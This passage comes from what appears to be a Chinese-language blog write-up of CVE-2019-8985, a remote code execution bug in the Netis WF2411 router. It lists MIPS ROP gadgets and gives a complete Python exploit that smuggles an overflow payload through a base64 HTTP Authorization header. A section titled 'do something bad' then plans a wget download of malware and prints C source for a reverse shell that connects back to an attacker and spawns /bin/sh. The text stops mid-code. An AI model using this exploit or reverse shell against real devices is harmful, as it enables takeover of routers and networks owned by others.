已知在 vuln 函数最后 jalr ra 之后 sp 是在 ra 上 4 字节&lt;/p&gt;
&lt;h3 id=&#34;gadget2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gadget2&#34;&gt;#&lt;/a&gt; gadget2&lt;/h3&gt;
&lt;p&gt;从 ra 开始到 cmd 结束 有 40 个字节的空区&lt;br&gt;
要充分利用这 40 字节 就需要降低 esp&lt;br&gt;
 在 libc 中找到此 gadget&lt;br&gt;
 &lt;code&gt;sp - 0x38 + 0x30 - 0x18 = sp - 0x20&lt;/code&gt;  的值给 &lt;code&gt;a0&lt;/code&gt;  寄存器&lt;br&gt;
然后跳到 先前的 &lt;code&gt;a0&lt;/code&gt;  里面去&lt;br&gt;
但是有个问题  &lt;code&gt;sp-0x20&lt;/code&gt;  是在 saved 寄存器存放的地方 肯定是很难布置过长的 cmd&lt;br&gt;
 而且 &lt;code&gt;a0&lt;/code&gt;  不可控 我们需要让 &lt;code&gt;a0&lt;/code&gt;  可控&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:00020650                 addiu   $sp, -0x38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00020654                 sw      $ra, 0x30+var_s0($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00020658                 sw      $gp, 0x30+var_20($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0002065C                 li      $v0, 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00020660                 move    $t9, $a0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00020664                 sw      $v0, 0x30+var_18($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00020668                 jalr    $t9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0002066C                 addiu   $a0, $sp, 0x30+var_18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;gadget1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gadget1&#34;&gt;#&lt;/a&gt; gadget1&lt;/h3&gt;
&lt;p&gt;而这个 gadget 依靠 &lt;code&gt;a0&lt;/code&gt;  进行跳转 我们需要控制 &lt;code&gt;a0&lt;/code&gt; &lt;br&gt;
libgcc 中&lt;br&gt;
我们可以控制 &lt;code&gt;a0&lt;/code&gt;  也可以控制跳转地址&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:00008B20                 move    $t9, $s4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00008B24                 jalr    $t9 ; sub_8770&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:00008B28                 move    $a0, $s0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;gadget3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gadget3&#34;&gt;#&lt;/a&gt; gadget3&lt;/h3&gt;
&lt;p&gt;同时 栈下去了 影响到我们的 s 寄存器列了 需要抬上来&lt;br&gt;
之前 &lt;code&gt;sp&lt;/code&gt;  减去了  &lt;code&gt;0x38&lt;/code&gt;  那么这里 + 上 &lt;code&gt;0x1c&lt;/code&gt;  的地方可以布置下一个 rop 并把 sp 加上来&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.init:000017A4                 lw      $ra, 0x1C+var_s0($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init:000017A8                 nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init:000017AC                 jr      $ra&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.init:000017B0                 addiu   $sp, 0x20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;gadget4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gadget4&#34;&gt;#&lt;/a&gt; gadget4&lt;/h3&gt;
&lt;p&gt;最后 通过 sp 加上 &lt;code&gt;0x18&lt;/code&gt;  的位置将 sp 回复到之前的 sp 一样的地址 并 jalr 到 s3&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABD4                 move    $a1, $s2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABD8                 move    $s0, $zero&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABDC                 move    $t9, $s3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABE0                 jalr    $t9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABE4                 movz    $s0, $v0, $v1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;流程图&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#流程图&#34;&gt;#&lt;/a&gt; 流程图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/liucheng.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch = &lt;span class=&#34;string&#34;&gt;&amp;quot;mips&amp;quot;&lt;/span&gt;, endian = &lt;span class=&#34;string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;, os = &lt;span class=&#34;string&#34;&gt;&amp;quot;Linux&amp;quot;&lt;/span&gt;, log_level = &lt;span class=&#34;string&#34;&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc 	   = &lt;span class=&#34;number&#34;&gt;0x77f2e000&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libgcc 	= &lt;span class=&#34;number&#34;&gt;0x77ee2000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system	= &lt;span class=&#34;number&#34;&gt;0x0002AC90&lt;/span&gt; + libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gadgets  = [&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0x00008B20&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0x00020650&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0x000017A4&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;0x0000ABD0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAXSZ	   = &lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmd		= &lt;span class=&#34;string&#34;&gt;b&amp;quot;echo &amp;#x27;hacked&amp;#x27; &amp;gt; CrimeStatement&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;exp&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rop = &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: x + libgcc,gadgets))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rop[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] = rop[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;] - libgcc + libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;[+] rop[&lt;span class=&#34;subst&#34;&gt;&amp;#123;i&amp;#125;&lt;/span&gt;] is &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(rop[i])&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;[+] system is &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload  = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a:%s&amp;#x27;&lt;/span&gt; %(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x3C&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(rop[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;])					&lt;span class=&#34;comment&#34;&gt;# &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(rop[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;])					&lt;span class=&#34;comment&#34;&gt;# s0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAA&amp;#x27;&lt;/span&gt;						&lt;span class=&#34;comment&#34;&gt;# s1 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;CCCC&amp;#x27;&lt;/span&gt; 						&lt;span class=&#34;comment&#34;&gt;# s2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(system)					&lt;span class=&#34;comment&#34;&gt;# s3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(rop[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;])					&lt;span class=&#34;comment&#34;&gt;# s4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(rop[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])					&lt;span class=&#34;comment&#34;&gt;# ra&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += cmd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header   = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;GET / HTTP/1.1\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;# header  += b&amp;#x27;Host: 127.0.0.1:80\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header  += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;Host: 10.10.10.1:80\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header  += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;Authorization: Basic %s\r\n&amp;#x27;&lt;/span&gt; % base64.b64encode(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header  += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;User-Agent: Real UserAgent\r\n\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	iport = (&lt;span class=&#34;string&#34;&gt;&amp;quot;10.10.10.1&amp;quot;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;# iport = (&amp;quot;127.0.0.1&amp;quot; ,80)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s.connect(iport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s.send(header)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	msg = s.recv(MAXSZ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Message is %s&amp;quot;&lt;/span&gt; %(msg))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	exp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719174740.png&#34; alt&gt;&lt;/p&gt;
&lt;h2 id=&#34;做点坏事&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#做点坏事&#34;&gt;#&lt;/a&gt; 做点坏事&lt;/h2&gt;
&lt;p&gt;既然都拿下了这么长的 cmd&lt;br&gt;
 那么不做点坏事也说不过去&lt;br&gt;
 busybox 中没有 &lt;code&gt;nc&lt;/code&gt;  也没有 &lt;code&gt;bash -i&lt;/code&gt;  之类的东西给我们做反向 shell&lt;/p&gt;
&lt;p&gt;但是有 &lt;code&gt;wget&lt;/code&gt;  下载恶意程序并运行&lt;/p&gt;
&lt;p&gt;编写恶意程序 &lt;code&gt;malware&lt;/code&gt;  (✨TODO 修改参数)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; port = atoi(argv[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* ip = argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; sd = socket(AF_INET, SOCK_STREAM, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;sin&lt;/span&gt; =&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		.sin_family = AF_INET,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		.sin_port = htons(port),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		.sin_addr.s_addr = inet_addr(ip),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	connect(sd, (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; sockaddr *)&amp;amp;&lt;span class=&#34;built_in&#34;&gt;sin&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;sin&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _ = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; _ &amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;; _++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		dup2(sd, _);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	execl(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span 